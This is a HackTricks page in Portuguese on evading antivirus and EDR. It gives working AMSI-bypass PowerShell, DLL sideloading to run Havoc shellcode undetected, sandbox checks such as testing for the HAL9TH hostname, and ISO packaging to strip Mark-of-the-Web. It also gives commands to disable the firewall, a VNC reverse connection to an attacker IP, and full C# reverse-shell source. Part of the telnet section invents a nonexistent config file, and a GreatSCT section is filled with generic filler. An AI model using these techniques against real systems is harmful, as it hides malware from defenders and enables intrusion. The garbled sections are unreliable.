# Bypass de Antivírus (AV)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Você trabalha em uma **empresa de cibersegurança**? Gostaria de ver sua **empresa anunciada no HackTricks**? Ou gostaria de ter acesso à **última versão do PEASS ou baixar o HackTricks em PDF**? Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
* Adquira o [**swag oficial do PEASS & HackTricks**](https://peass.creator-spring.com)
* **Junte-se ao** [**💬**](https://emojipedia.org/speech-balloon/) [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo Telegram**](https://t.me/peass) ou **siga-me** no **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para o** [**repositório hacktricks**](https://github.com/carlospolop/hacktricks) **e para o** [**repositório hacktricks-cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>

**Esta página foi escrita por** [**@m2rc\_p**](https://twitter.com/m2rc\_p)**!**

## **Metodologia de Evasão de AV**

Atualmente, os AVs utilizam diferentes métodos para verificar se um arquivo é malicioso ou não, como detecção estática, análise dinâmica e, para os EDRs mais avançados, análise comportamental.

### **Detecção estática**

A detecção estática é alcançada marcando strings ou arrays de bytes maliciosos conhecidos em um binário ou script, e também extraindo informações do próprio arquivo (por exemplo, descrição do arquivo, nome da empresa, assinaturas digitais, ícone, checksum, etc.). Isso significa que o uso de ferramentas públicas conhecidas pode te expor mais facilmente, pois provavelmente já foram analisadas e marcadas como maliciosas. Existem algumas maneiras de contornar esse tipo de detecção:

* **Criptografia**

Se você criptografar o binário, o AV não terá como detectar seu programa, mas você precisará de algum tipo de carregador para descriptografar e executar o programa na memória.

* **Ofuscação**

Às vezes, tudo o que você precisa fazer é alterar algumas strings em seu binário ou script para passar pelo AV, mas isso pode ser uma tarefa demorada, dependendo do que você está tentando ofuscar.

* **Ferramentas personalizadas**

Se você desenvolver suas próprias ferramentas, não haverá assinaturas maliciosas conhecidas, mas isso requer muito tempo e esforço.

{% hint style="info" %}
Uma boa maneira de verificar a detecção estática do Windows Defender é usar o [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Ele divide o arquivo em vários segmentos e solicita ao Defender que escaneie cada um individualmente, dessa forma, ele pode informar exatamente quais strings ou bytes estão marcados em seu binário.
{% endhint %}

Recomendo fortemente que você confira esta [playlist do YouTube](https://www.youtube.com/playlist?list=PLj05gPj8rk\_pkb12mDe4PgYZ5qPxhGKGf) sobre Evasão de AV na prática.

### **Análise dinâmica**

A análise dinâmica ocorre quando o AV executa seu binário em um ambiente controlado e observa atividades maliciosas (por exemplo, tentar descriptografar e ler as senhas do seu navegador, realizar um minidespejo no LSASS, etc.). Essa parte pode ser um pouco mais complicada de lidar, mas aqui estão algumas coisas que você pode fazer para evitar os ambientes controlados.

* **Atraso antes da execução** Dependendo de como é implementado, pode ser uma ótima maneira de contornar a análise dinâmica do AV. Os AVs têm um tempo muito curto para escanear arquivos para não interromper o fluxo de trabalho do usuário, então usar atrasos longos pode atrapalhar a análise dos binários. O problema é que muitos ambientes controlados dos AVs podem simplesmente ignorar o atraso, dependendo de como ele é implementado.
* **Verificação dos recursos da máquina** Geralmente, os ambientes controlados têm recursos muito limitados para trabalhar (por exemplo, < 2GB de RAM), caso contrário, eles podem deixar a máquina do usuário lenta. Você também pode ser muito criativo aqui, por exemplo, verificando a temperatura da CPU ou até mesmo as velocidades do ventilador, nem tudo será implementado no ambiente controlado.
* **Verificações específicas da máquina** Se você deseja atingir um usuário cuja estação de trabalho está conectada ao domínio "contoso.local", você pode verificar o domínio do computador para ver se corresponde ao que você especificou. Se não corresponder, você pode fazer seu programa sair.

Acontece que o nome do computador do Sandbox do Microsoft Defender é HAL9TH, então você pode verificar o nome do computador em seu malware antes da detonação, se o nome corresponder a HAL9TH, significa que você está dentro do sandbox do Defender, então você pode fazer seu programa sair.

<figure><img src="../.gitbook/assets/image (3) (6).png" alt=""><figcaption><p>fonte: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Aqui estão algumas outras dicas muito boas do [@mgeeky](https://twitter.com/mariuszbit) para lidar com ambientes controlados

<figure><img src="../.gitbook/assets/image (2) (1) (1) (2) (1).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Como mencionamos anteriormente neste post, **ferramentas públicas** eventualmente **serão detectadas**, então você deve se perguntar algo:

Por exemplo, se você deseja extrair o LSASS, **você realmente precisa usar o mimikatz**? Ou você poderia usar um projeto diferente que seja menos conhecido e também extraia o LSASS.

A resposta certa provavelmente é a segunda opção. Tomando o mimikatz como exemplo, ele provavelmente é um dos, senão o malware mais marcado pelos AVs e EDRs, embora o projeto em si seja muito legal, também é um pesadelo trabalhar com ele para contornar os AVs, então procure alternativas para o que você está tentando alcançar.

{% hint style="info" %}
Ao modificar seus payloads para evasão, certifique-se de **desativar o envio automático de amostras** no Defender e, por favor, sério, **NÃO FAÇA UPLOAD NO VIRUSTOTAL** se seu objetivo é alcançar a evasão a longo prazo. Se você quiser verificar se seu payload é detectado por um AV específico, instale-o em uma VM, tente desativar o envio automático de amostras e teste lá até ficar satisfeito com o resultado.
{% endhint %}
## EXEs vs DLLs

Sempre que possível, **priorize o uso de DLLs para evitar detecção**, em minha experiência, arquivos DLL geralmente são **muito menos detectados** e analisados, então é um truque muito simples de usar para evitar detecção em alguns casos (se o seu payload tiver alguma forma de ser executado como uma DLL, é claro).

Como podemos ver nesta imagem, um Payload DLL do Havoc tem uma taxa de detecção de 4/26 no antiscan.me, enquanto o payload EXE tem uma taxa de detecção de 7/26.

<figure><img src="../.gitbook/assets/image (6) (3) (1).png" alt=""><figcaption><p>Comparação do antiscan.me entre um payload EXE normal do Havoc e um DLL normal do Havoc</p></figcaption></figure>

Agora mostraremos alguns truques que você pode usar com arquivos DLL para ser muito mais furtivo.

## DLL Sideloading & Proxying

**DLL Sideloading** aproveita a ordem de pesquisa de DLL usada pelo carregador, posicionando tanto o aplicativo vítima quanto os payloads maliciosos lado a lado.

Você pode verificar programas suscetíveis a DLL Sideloading usando o [Siofra](https://github.com/Cybereason/siofra) e o seguinte script do powershell:

{% code overflow="wrap" %}
```powershell
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Este comando irá exibir a lista de programas suscetíveis a DLL hijacking dentro de "C:\Program Files\\" e os arquivos DLL que eles tentam carregar.

Eu recomendo fortemente que você **explore os programas DLL Hijackable/Sideloadable por si mesmo**, essa técnica é bastante furtiva quando feita corretamente, mas se você usar programas DLL Sideloadable conhecidos publicamente, você pode ser facilmente descoberto.

Apenas colocar uma DLL maliciosa com o nome que um programa espera carregar não irá carregar sua carga útil, pois o programa espera algumas funções específicas dentro dessa DLL. Para resolver esse problema, usaremos outra técnica chamada **DLL Proxying/Forwarding**.

**DLL Proxying** encaminha as chamadas que um programa faz da DLL proxy (e maliciosa) para a DLL original, preservando assim a funcionalidade do programa e sendo capaz de lidar com a execução da sua carga útil.

Eu estarei usando o projeto [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) de [@flangvik](https://twitter.com/Flangvik/)

Estes são os passos que eu segui:

{% code overflow="wrap" %}
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
O último comando nos dará 2 arquivos: um modelo de código-fonte DLL e a DLL original renomeada.

<figure><img src="../.gitbook/assets/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>

{% code overflow="wrap" %}
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
{% endcode %}

Estes são os resultados:

<figure><img src="../.gitbook/assets/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Tanto nosso shellcode (codificado com [SGN](https://github.com/EgeBalci/sgn)) quanto a DLL proxy têm uma taxa de detecção de 0/26 no [antiscan.me](https://antiscan.me)! Eu chamaria isso de sucesso.

<figure><img src="../.gitbook/assets/image (11) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Eu **recomendo fortemente** que você assista ao VOD do [twitch de S3cur3Th1sSh1t](https://www.twitch.tv/videos/1644171543) sobre DLL Sideloading e também ao vídeo do [ippsec](https://www.youtube.com/watch?v=3eROsG\_WNpE) para aprender mais sobre o que discutimos de forma mais aprofundada.
{% endhint %}

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze é um conjunto de ferramentas de payload para contornar EDRs usando processos suspensos, syscalls diretos e métodos de execução alternativos`

Você pode usar o Freeze para carregar e executar seu shellcode de maneira furtiva.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../.gitbook/assets/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
A evasão é apenas um jogo de gato e rato, o que funciona hoje pode ser detectado amanhã, então nunca confie em apenas uma ferramenta, se possível, tente encadear várias técnicas de evasão.
{% endhint %}

## AMSI (Interface de Verificação Anti-Malware)

AMSI foi criado para prevenir "malware sem arquivo". Inicialmente, os AVs eram capazes de escanear apenas **arquivos em disco**, então se você pudesse executar payloads **diretamente na memória**, o AV não poderia fazer nada para impedi-lo, pois não tinha visibilidade suficiente.

A funcionalidade AMSI está integrada nesses componentes do Windows.

* Controle de Conta de Usuário, ou UAC (elevação de instalação EXE, COM, MSI ou ActiveX)
* PowerShell (scripts, uso interativo e avaliação de código dinâmico)
* Windows Script Host (wscript.exe e cscript.exe)
* JavaScript e VBScript
* Macros do Office VBA

Ele permite que as soluções antivírus inspecionem o comportamento do script, expondo o conteúdo do script de forma não criptografada e não ofuscada.

Executar `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` produzirá o seguinte alerta no Windows Defender.

<figure><img src="../.gitbook/assets/image (4) (5).png" alt=""><figcaption></figcaption></figure>

Observe como ele adiciona `amsi:` e, em seguida, o caminho para o executável a partir do qual o script foi executado, neste caso, powershell.exe

Não deixamos nenhum arquivo no disco, mas ainda fomos detectados na memória por causa do AMSI.

Existem algumas maneiras de contornar o AMSI:

* **Ofuscação**

Como o AMSI funciona principalmente com detecções estáticas, modificar os scripts que você tenta carregar pode ser uma boa maneira de evitar a detecção.

No entanto, o AMSI tem a capacidade de desofuscar scripts mesmo que tenham várias camadas, então a ofuscação pode ser uma opção ruim dependendo de como for feita. Isso torna a evasão não tão direta. No entanto, às vezes, tudo o que você precisa fazer é mudar alguns nomes de variáveis e estará tudo bem, então depende de quanto algo foi sinalizado.

* **Bypass do AMSI**

Como o AMSI é implementado carregando uma DLL no processo do powershell (também cscript.exe, wscript.exe, etc.), é possível manipulá-lo facilmente, mesmo sendo executado como um usuário não privilegiado. Devido a essa falha na implementação do AMSI, pesquisadores encontraram várias maneiras de evitar a verificação do AMSI.

**Forçando um Erro**

Forçar a inicialização do AMSI a falhar (amsiInitFailed) fará com que nenhum escaneamento seja iniciado para o processo atual. Originalmente, isso foi divulgado por [Matt Graeber](https://twitter.com/mattifestation) e a Microsoft desenvolveu uma assinatura para evitar o uso mais amplo.

{% code overflow="wrap" %}
```powershell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
{% endcode %}

Tudo o que foi necessário foi uma linha de código powershell para tornar o AMSI inutilizável para o processo powershell atual. Essa linha, é claro, foi detectada pelo próprio AMSI, então algumas modificações são necessárias para usar essa técnica.

Aqui está um bypass modificado do AMSI que peguei deste [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db).
```powershell
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
**Patching de Memória**

Essa técnica foi descoberta inicialmente por [@RastaMouse](https://twitter.com/\_RastaMouse/) e envolve encontrar o endereço da função "AmsiScanBuffer" em amsi.dll (responsável por escanear a entrada fornecida pelo usuário) e sobrescrevê-la com instruções para retornar o código E\_INVALIDARG, dessa forma, o resultado do escaneamento real retornará 0, que é interpretado como um resultado limpo.

{% hint style="info" %}
Por favor, leia [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) para uma explicação mais detalhada.
{% endhint %}

Existem também muitas outras técnicas usadas para contornar o AMSI com o PowerShell, confira [**esta página**](basic-powershell-for-pentesters/#amsi-bypass) e [este repositório](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) para saber mais sobre elas.

## Ofuscação

Existem várias ferramentas que podem ser usadas para **ofuscar código C# em texto claro**, gerar **modelos de metaprogramação** para compilar binários ou **ofuscar binários compilados**, como:

* [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: Ofuscador C#**
* [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): O objetivo deste projeto é fornecer um fork de código aberto do conjunto de compilação [LLVM](http://www.llvm.org/) capaz de fornecer maior segurança de software por meio de [ofuscação de código](http://en.wikipedia.org/wiki/Obfuscation\_\(software\)) e proteção contra adulteração.
* [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstra como usar a linguagem `C++11/14` para gerar, em tempo de compilação, código ofuscado sem usar nenhuma ferramenta externa e sem modificar o compilador.
* [**obfy**](https://github.com/fritzone/obfy): Adicione uma camada de operações ofuscadas geradas pelo framework de metaprogramação de modelos C++ que tornará um pouco mais difícil para a pessoa que deseja quebrar o aplicativo.
* [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz é um ofuscador de binários x64 capaz de ofuscar vários arquivos PE diferentes, incluindo: .exe, .dll, .sys
* [**metame**](https://github.com/a0rtega/metame): Metame é um mecanismo simples de código metamórfico para executáveis arbitrários.
* [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator é um framework de ofuscação de código de granularidade fina para linguagens suportadas pelo LLVM usando ROP (programação orientada por retorno). O ROPfuscator ofusca um programa no nível de código de montagem, transformando instruções regulares em cadeias ROP, frustrando nossa concepção natural de fluxo de controle normal.
* [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt é um criptografador .NET PE escrito em Nim
* [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor é capaz de converter EXE/DLL existentes em shellcode e depois carregá-los

## SmartScreen e MoTW

Você pode ter visto essa tela ao baixar alguns executáveis da internet e executá-los.

O Microsoft Defender SmartScreen é um mecanismo de segurança destinado a proteger o usuário final contra a execução de aplicativos potencialmente maliciosos.

<figure><img src="../.gitbook/assets/image (1) (4).png" alt=""><figcaption></figcaption></figure>

O SmartScreen funciona principalmente com uma abordagem baseada em reputação, o que significa que aplicativos baixados de forma incomum acionarão o SmartScreen, alertando e impedindo o usuário final de executar o arquivo (embora o arquivo ainda possa ser executado clicando em Mais informações -> Executar mesmo assim).

**MoTW** (Mark of The Web) é um [NTFS Alternate Data Stream](https://en.wikipedia.org/wiki/NTFS#Alternate\_data\_stream\_\(ADS\)) com o nome de Zone.Identifier, que é criado automaticamente ao baixar arquivos da internet, juntamente com a URL de onde foi baixado.

<figure><img src="../.gitbook/assets/image (13) (3).png" alt=""><figcaption><p>Verificando o ADS Zone.Identifier para um arquivo baixado da internet.</p></figcaption></figure>

{% hint style="info" %}
É importante observar que executáveis assinados com um certificado de assinatura **confiável** não acionarão o SmartScreen.
{% endhint %}

Uma maneira muito eficaz de evitar que seus payloads recebam o Mark of The Web é empacotá-los dentro de algum tipo de contêiner, como um ISO. Isso acontece porque o Mark-of-the-Web (MOTW) **não pode** ser aplicado a volumes **não NTFS**.

<figure><img src="../.gitbook/assets/image (12) (2) (2).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/) é uma ferramenta que empacota payloads em contêineres de saída para evitar o Mark-of-the-Web.

Exemplo de uso:
```powershell
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
Aqui está uma demonstração de como contornar o SmartScreen empacotando payloads dentro de arquivos ISO usando o [PackMyPayload](https://github.com/mgeeky/PackMyPayload/)

<figure><img src="../.gitbook/assets/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## Reflexão de Assembleia C#

Carregar binários C# na memória é algo conhecido há algum tempo e ainda é uma ótima maneira de executar suas ferramentas pós-exploração sem ser detectado pelo AV.

Como o payload será carregado diretamente na memória sem tocar no disco, só precisaremos nos preocupar em corrigir o AMSI para todo o processo.

A maioria dos frameworks de C2 (sliver, Covenant, metasploit, CobaltStrike, Havoc, etc.) já oferece a capacidade de executar assemblies C# diretamente na memória, mas existem diferentes maneiras de fazer isso:

* **Fork\&Run**

Isso envolve **iniciar um novo processo sacrificial**, injetar seu código malicioso de pós-exploração nesse novo processo, executar seu código malicioso e, quando terminar, encerrar o novo processo. Isso tem suas vantagens e desvantagens. A vantagem do método fork and run é que a execução ocorre **fora** do nosso processo de implantação Beacon. Isso significa que se algo der errado ou for detectado em nossa ação de pós-exploração, há uma **maior chance** de nossa **implantação sobreviver**. A desvantagem é que você tem uma **maior chance** de ser detectado por **Detecções Comportamentais**.

<figure><img src="../.gitbook/assets/image (7) (1) (3).png" alt=""><figcaption></figcaption></figure>

* **Inline**

Trata-se de injetar o código malicioso de pós-exploração **em seu próprio processo**. Dessa forma, você pode evitar ter que criar um novo processo e fazê-lo ser verificado pelo AV, mas a desvantagem é que se algo der errado com a execução do seu payload, há uma **maior chance** de **perder seu beacon** pois ele pode travar.

<figure><img src="../.gitbook/assets/image (9) (3).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
Se você quiser ler mais sobre o carregamento de Assembleias C#, confira este artigo [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) e o BOF InlineExecute-Assembly deles ([https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly))
{% endhint %}

Você também pode carregar Assembleias C# **a partir do PowerShell**, confira o [Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) e o vídeo do [S3cur3th1sSh1t](https://www.youtube.com/watch?v=oe11Q-3Akuk).

## Usando Outras Linguagens de Programação

Conforme proposto em [**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins), é possível executar código malicioso usando outras linguagens, dando à máquina comprometida acesso **ao ambiente do interpretador instalado no compartilhamento SMB controlado pelo atacante**.&#x20;

Ao permitir o acesso aos Binários do Interpretador e ao ambiente no compartilhamento SMB, você pode **executar código arbitrário nessas linguagens na memória** da máquina comprometida.

O repositório indica: O Defender ainda escaneia os scripts, mas ao utilizar Go, Java, PHP, etc., temos **mais flexibilidade para contornar assinaturas estáticas**. Testes com scripts de shell reverso não obfuscados aleatórios nessas linguagens têm sido bem-sucedidos.

## Evasão Avançada

A evasão é um tópico muito complicado, às vezes você precisa levar em consideração muitas fontes diferentes de telemetria em apenas um sistema, então é praticamente impossível ficar completamente indetectável em ambientes maduros.

Cada ambiente que você enfrenta terá suas próprias forças e fraquezas.

Eu recomendo fortemente que você assista a essa palestra do [@ATTL4S](https://twitter.com/DaniLJ94), para ter uma introdução a técnicas de evasão avançadas.

{% embed url="https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo" %}

Esta também é outra ótima palestra do [@mariuszbit](https://twitter.com/mariuszbit) sobre Evasão em Profundidade.

{% embed url="https://www.youtube.com/watch?v=IbA7Ung39o4" %}

## **Técnicas Antigas**

### **Servidor Telnet**

Até o Windows 10, todos os Windows vinham com um **servidor Telnet** que você poderia instalar (como administrador) fazendo:
```
pkgmgr /iu:"TelnetServer" /quiet
```
Faça com que ele **inicie** quando o sistema for iniciado e **execute** agora:
```
sc config TlntSVR start= auto obj= localsystem
```
**Alterar a porta do telnet** (furtivo) e desativar o firewall:

Para aumentar a segurança do sistema, é recomendado alterar a porta padrão do telnet para evitar ataques direcionados. Além disso, desativar o firewall pode permitir que o tráfego de entrada e saída seja executado sem restrições. No entanto, é importante lembrar que desativar o firewall pode expor o sistema a possíveis ameaças externas.

Para alterar a porta do telnet, siga as etapas abaixo:

1. Abra o arquivo de configuração do telnet. No Windows, o arquivo está localizado em `C:\Windows\System32\telnet.exe.config`.

2. Localize a seção `<system.serviceModel>` no arquivo de configuração.

3. Dentro dessa seção, encontre a tag `<bindings>` e, em seguida, a tag `<binding>`.

4. Dentro da tag `<binding>`, altere o valor do atributo `port` para a porta desejada. Por exemplo, `<binding name="TelnetBinding" port="1234">`.

5. Salve as alterações no arquivo de configuração.

Para desativar o firewall, siga as etapas abaixo:

1. Abra o Painel de Controle e clique em "Sistema e Segurança".

2. Selecione "Firewall do Windows Defender" ou "Firewall do Windows".

3. No painel esquerdo, clique em "Ativar ou desativar o Firewall do Windows".

4. Selecione a opção "Desativar o Firewall do Windows (não recomendado)" para todas as redes (pública, particular e domínio).

5. Clique em "OK" para salvar as alterações.

Lembre-se de que alterar a porta do telnet e desativar o firewall podem ter impactos na segurança do sistema. Certifique-se de avaliar os riscos e implementar outras medidas de segurança adequadas para proteger o sistema contra possíveis ameaças.
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

Faça o download em: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html) (você quer os downloads binários, não a instalação)

**NO HOST**: Execute _**winvnc.exe**_ e configure o servidor:

* Habilite a opção _Disable TrayIcon_
* Defina uma senha em _VNC Password_
* Defina uma senha em _View-Only Password_

Em seguida, mova o binário _**winvnc.exe**_ e o arquivo **recém-criado** _**UltraVNC.ini**_ para dentro da **vítima**

#### **Conexão reversa**

O **atacante** deve **executar dentro** do seu **host** o binário `vncviewer.exe -listen 5900` para que ele esteja **preparado** para capturar uma conexão reversa do **VNC**. Em seguida, dentro da **vítima**: Inicie o daemon winvnc `winvnc.exe -run` e execute `winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900`

**ATENÇÃO:** Para manter o sigilo, você não deve fazer algumas coisas

* Não inicie o `winvnc` se ele já estiver em execução ou você ativará um [pop-up](https://i.imgur.com/1SROTTl.png). Verifique se está em execução com `tasklist | findstr winvnc`
* Não inicie o `winvnc` sem o arquivo `UltraVNC.ini` no mesmo diretório, pois isso abrirá [a janela de configuração](https://i.imgur.com/rfMQWcf.png)
* Não execute `winvnc -h` para obter ajuda, pois isso ativará um [pop-up](https://i.imgur.com/oc18wcu.png)

### GreatSCT

Faça o download em: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
Dentro do GreatSCT:

## Bypassando Antivírus

Ao realizar testes de penetração, é comum encontrar sistemas protegidos por antivírus que podem detectar e bloquear as ferramentas de hacking. No entanto, existem técnicas que podem ser usadas para contornar essas proteções e executar com sucesso o código malicioso.

### Ofuscando o código

Uma das maneiras mais eficazes de evitar a detecção do antivírus é ofuscar o código malicioso. Isso envolve a modificação do código para torná-lo menos reconhecível pelo antivírus. Existem várias ferramentas disponíveis que podem ajudar nesse processo, como o Veil-Evasion e o Shellter.

### Criando payloads personalizados

Outra técnica eficaz é criar payloads personalizados. Em vez de usar ferramentas de hacking prontas, você pode criar seu próprio código malicioso personalizado. Isso torna mais difícil para o antivírus detectar o payload, pois ele não estará presente em suas definições de assinatura.

### Testando a detecção do antivírus

Antes de implantar seu código malicioso, é importante testar a detecção do antivírus. Existem várias ferramentas disponíveis, como o VirusTotal, que podem verificar se o seu payload é detectado por vários antivírus. Isso permite que você faça ajustes no código, se necessário, para evitar a detecção.

### Evitando detecção em tempo de execução

Além de ofuscar o código e criar payloads personalizados, você também pode usar técnicas para evitar a detecção em tempo de execução. Isso envolve a criação de técnicas de evasão que permitem que o código malicioso seja executado sem ser detectado pelo antivírus. Algumas técnicas comuns incluem a injeção de código em processos legítimos e o uso de técnicas de injeção de DLL.

### Conclusão

Bypassar o antivírus é um desafio comum enfrentado pelos hackers durante os testes de penetração. No entanto, com as técnicas certas, é possível contornar essas proteções e executar com sucesso o código malicioso. É importante lembrar que o uso dessas técnicas deve ser feito apenas para fins legais e éticos, como parte de um teste de penetração autorizado.
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
Agora **inicie o lister** com `msfconsole -r file.rc` e **execute** o **payload xml** com:
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**O defensor atual encerrará o processo muito rapidamente.**

### Compilando nosso próprio shell reverso

https://medium.com/@Bank\_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### Primeiro shell reverso em C#

Compile-o com:
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
Use-o com:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
[https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs](https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple\_Rev\_Shell.cs)

### C# usando compilador
```
